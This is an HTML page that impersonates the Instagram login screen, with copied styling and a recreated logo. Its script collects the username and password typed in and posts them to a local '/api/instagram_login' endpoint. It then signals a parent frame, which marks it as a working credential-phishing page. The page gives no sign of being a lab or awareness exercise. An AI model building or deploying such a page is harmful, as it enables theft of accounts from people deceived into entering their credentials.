<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Log in to Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: #f8f8f8;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-container {
            width: 100%;
            max-width: 480px;
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            padding: 50px 55px 40px 55px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }

        .instagram-logo {
            width: 68px;
            height: 68px;
            margin-bottom: 18px;
            display: block;
            margin-left: auto;
            margin-right: auto;
}

        h1 {
            font-size: 29px;
            font-weight: 700;
            color: #262626;
            margin-bottom: 40px;
            letter-spacing: -0.8px;
            white-space: nowrap;
        }

        .input-field {
            width: 100%;
            padding: 16px 18px;
            font-size: 17px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 30px;
            outline: none;
            margin-bottom: 16px;
            transition: all 0.2s;
        }

        .input-field:focus {
            border-color: #0095f6;
            background-color: #fff;
            box-shadow: 0 0 0 2px rgba(0, 149, 246, 0.1);
        }

        .input-field::placeholder {
            color: #8e8e8e;
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            margin: 16px 0 24px;
            background-color: #0095f6;
            color: #ffffff;
            font-size: 17px;
            font-weight: 600;
            border: none;
            border-radius: 30px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .login-btn:hover {
            background-color: #0077c5;
        }

        .forgotten {
            color: #0095f6;
            font-size: 15px;
            text-decoration: none;
            margin-bottom: 30px;
            display: inline-block;
        }

        .forgotten:hover {
            text-decoration: underline;
        }
    </style>
</head>

<body>
    <div class="login-container">

        <svg class="instagram-logo" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
            <defs>
                <radialGradient id="ig-radial" cx="30%" cy="107%" r="120%" fx="30%" fy="107%">
                    <stop offset="0%" stop-color="#ffd676" />
                    <stop offset="15%" stop-color="#f9a844" />
                    <stop offset="30%" stop-color="#f47033" />
                    <stop offset="45%" stop-color="#e23462" />
                    <stop offset="65%" stop-color="#c22f96" />
                    <stop offset="80%" stop-color="#8b37b8" />
                    <stop offset="100%" stop-color="#4e60d3" />
                </radialGradient>
                <linearGradient id="ig-overlay" x1="100%" y1="0%" x2="0%" y2="100%">
                    <stop offset="0%" stop-color="#4e60d3" stop-opacity="0.6" />
                    <stop offset="40%" stop-color="#8b37b8" stop-opacity="0.3" />
                    <stop offset="100%" stop-color="#ffd676" stop-opacity="0" />
                </linearGradient>
            </defs>

            <!-- Background -->
            <rect width="200" height="200" rx="46" ry="46" fill="url(#ig-radial)" />
            <rect width="200" height="200" rx="46" ry="46" fill="url(#ig-overlay)" />

            <!-- Camera body outline -->
            <rect x="28" y="28" width="144" height="144" rx="36" ry="36" fill="none" stroke="white" stroke-width="11" />

            <!-- Lens outer ring -->
            <circle cx="100" cy="103" r="40" fill="none" stroke="white" stroke-width="11" />

            <!-- Lens inner circle -->
            <circle cx="100" cy="103" r="19" fill="white" />

            <!-- Viewfinder dot -->
            <circle cx="148" cy="56" r="10" fill="white" />
        </svg>

        <h1>Log in to Instagram</h1>

        <input class="input-field" type="text" id="email" placeholder="Phone number, username, or email" />
        <input class="input-field" type="password" id="password" placeholder="Password" />

        <button class="login-btn" onclick="login()">Log in</button>

        <a href="#" class="forgotten">Forgot password?</a>
    </div>

    <script>
        async function login() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            if (!email || !password) {
                alert("Please enter username/email and password");
                return;
            }

            try {
                const apiHost = window.location.protocol === 'file:' ? 'http://localhost:5001' : '';
                const endpoint = apiHost + '/api/instagram_login';
                await fetch(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });
                window.parent.postMessage({ type: 'INSTAGRAM_LOGIN_DONE' }, '*');
            } catch (error) {
                console.error(error);
                window.parent.postMessage({ type: 'INSTAGRAM_LOGIN_DONE' }, '*');
            }
        }

        document.addEventListener('keypress', function (e) {
            if (e.key === "Enter") login();
        });
    </script>
</body>
</html>
